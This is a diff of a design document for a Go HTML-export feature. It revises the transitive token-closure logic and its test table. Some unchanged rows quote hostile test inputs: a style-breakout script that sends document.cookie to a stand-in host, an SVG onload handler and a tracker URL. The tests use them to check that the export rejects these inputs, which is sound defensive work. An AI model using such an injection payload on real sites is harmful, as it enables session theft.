@@ -80,8 +80,11 @@ func HTML(d *doc.Doc, nodeID string, o HTMLOptions) (string, error)
 // the bundle's path to a browser, re-checks.
 func ExportHTML(d *doc.Doc, artboardID string, assetPath func(ref string) string) (string, error)
 
-// TokensUsed is every token referenced by var(--x) in the subtree, plus the
-// tokens those tokens' values reference, sorted by name. Unknown names are skipped.
+// TokensUsed is every token referenced by var(--x) in the subtree, closed over
+// token values: the closure (a fixed point, however many levels deep, with a
+// visited set so a reference cycle terminates and each token appears once),
+// sorted by name. Unknown names are skipped. Task 12's token notices and the
+// export's tokens.css both rely on the closure (re-review RR-I11-2).
 func TokensUsed(d *doc.Doc, nodeID string) []doc.Token
 
 // AssetsUsed is every asset ref in the subtree (img src and url() values), sorted.
@@ -165,7 +168,7 @@ digests match.
 | `TestExportHTML_standalone` | the output has no `http`, no `src=` outside `assets/`, no `<script`, and one `:root` block with exactly the tokens used | an export that references the canvas |
 | `TestExportHTML_hostileNode` (re-review RR-M1) | the same permissive-`Checker` fixture route, in turn: an svg node whose stored `SVG` is `<svg xmlns="http://www.w3.org/2000/svg" onload="x()"/>`; an svg node whose stored markup is canonical for another node id; a frame with the declaration `margin: 0` (not in the dialect) → each an error that `errors.Is` `dialect.ErrUnsafeNode` and names the node id (and `svg` or `margin`), no string returned; a document built through the real `Checker` exports unchanged | an export that trusts a replayed document's node content (SVG written verbatim, declarations unchecked) |
 | `TestExportHTML_hostileToken` | a fixture document built through `Apply` with a permissive fake `Checker` (as `store.Replay` would), whose artboard uses `var(--brand)`, with `brand` (type `font-family`) set in turn to each of the review's two values — `red}</style><script>fetch('https://x.example/?'+document.cookie)</script><style>` and `url(https://tracker.example/p.png)` → an error that `errors.Is` `dialect.ErrUnsafeToken` and names `brand`, and no string returned; the same document with `brand` = `"Inter", sans-serif` exports | a script or a remote fetch in the bundle's `<slug>.html` the moment a person opens it (review I2) |
-| `TestTokensUsed_transitive` | `--a: var(--b)` used by a node yields `a` and `b` | nested tokens dropped from export |
+| `TestTokensUsed_transitive` | three rows. A node using `var(--a)`, with `--a: var(--b)` and `--b: var(--c)`, yields `a`, `b`, `c`. A cycle, `--a: var(--b)` and `--b: var(--a)`, returns `a`, `b` once each, and returns (the test runs it under a 1 s timeout). A chain through an unknown name, `--a: var(--gone)`, yields `a` only | nested tokens dropped from export; a one-hop reading (direct references plus theirs, `c` missed; re-review RR-I11-2); a cycle that never ends or repeats a token |
 
 ## Steps
 
